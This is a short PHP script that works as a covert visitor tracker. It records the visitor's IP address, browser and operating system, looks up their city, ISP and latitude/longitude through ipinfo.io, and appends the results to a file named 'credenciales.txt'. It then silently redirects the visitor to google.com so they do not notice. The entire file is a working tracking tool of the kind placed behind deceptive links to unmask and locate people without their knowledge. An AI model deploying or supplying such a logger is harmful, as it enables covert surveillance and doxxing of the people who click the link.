<?php
/*

Script by Jairo.py

Scaner User agent by: https://github.com/zsxsoft/php-useragent

*/

ini_set('display_errors', 'On');
error_reporting(E_ALL);
include 'php/useragent.class.php';

$useragent = UserAgentFactory::analyze($_SERVER['HTTP_USER_AGENT']);

   function obtener_ip() {
      if(isset($_SERVER['HTTP_CLIENT_IP'])){
          return $_SERVER['HTTP_CLIENT_IP'];
      } elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
          return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
          return (isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : '');
      }
  }
  
  $ip = obtener_ip();
  
  $curl = curl_init();
  
  $query = "https://ipinfo.io/".$ip;
  
  $api = curl_init($query);
  
  curl_setopt($api, CURLOPT_RETURNTRANSFER, TRUE);
  $data = curl_exec($api);
  curl_close($api);
  
  $json = json_decode($data, true);
  
  
  $credenciales = ''.
  
   
   'User Agent                      : ' . $useragent->useragent . "\n".
   'Sistema Operativo               : ' . $useragent->os['title'] . "\n".
   'Explorador                      : ' . $useragent->browser['title'] . "\n".
   'IP                              : ' . $json['ip'] . "\n".
   'Pais                            : ' . $json['country'] . "\n".
   'Ciudad                          : ' . $json['city'] . "\n".
   'Proveedor Internet              : ' . $json['hostname'] . "\n".
   'Latitud - Longitud 	            : ' . $json['loc'] . "\n".
    "\n\n";

header("Location: https://www.google.com/");
$file = fopen("credenciales.txt", "a");
fwrite($file, $credenciales . PHP_EOL);
fclose($file);
exit;




